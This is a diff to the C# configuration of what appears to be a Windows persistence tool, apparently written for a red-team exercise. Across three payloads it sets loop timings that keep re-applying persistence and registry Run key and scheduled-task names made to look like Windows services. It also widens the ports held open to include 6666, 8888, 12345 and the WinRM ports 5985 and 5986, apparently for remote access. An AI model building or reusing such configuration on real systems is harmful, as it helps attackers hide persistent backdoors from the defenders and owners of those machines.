@@ -4,7 +4,7 @@ public class Config // This is for Binary 1
     public static bool Debugging { get; private set; } = false; //Set to true for debugging messages and logs
     public static int sleepTime { get; private set; } = 46000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                                // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
-    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53 }; // Ports to keep open
+    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 6666, 8888, 12345, 5985, 5986 }; // Ports to keep open
 
     public static string RunKeyName { get; private set; } = "Network Information Service";
     public static string ScheduledTaskName { get; private set; } = "IndexSearch";
@@ -46,7 +46,7 @@ public class Config // This is for payload 2
     public static int sleepTime { get; private set; } = 40000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                                // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
 
-    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53 }; // Ports to keep open
+    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 6666, 8888, 12345, 5985, 5986 }; // Ports to keep open
 
 
     public static string RunKeyName { get; private set; } = "WindowsCritical";
@@ -86,7 +86,7 @@ public class Config // This is for payload 3
     public static int sleepTime { get; private set; } = 52000; //decides system usage: The time that the loop sleeps in milliseconds between running all persistence.   
                                                                // used 46 seconds for UB lockdown deploy. Lower time increases the strength of the persistence
 
-    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 53 }; // Ports to keep open
+    public static int[] PortsToKeepOpen { get; private set; } = new int[] { 80, 443, 6666, 8888, 12345, 5985, 5986  }; // Ports to keep open
 
 
     public static string RunKeyName { get; private set; } = "Windows Service Initializer";
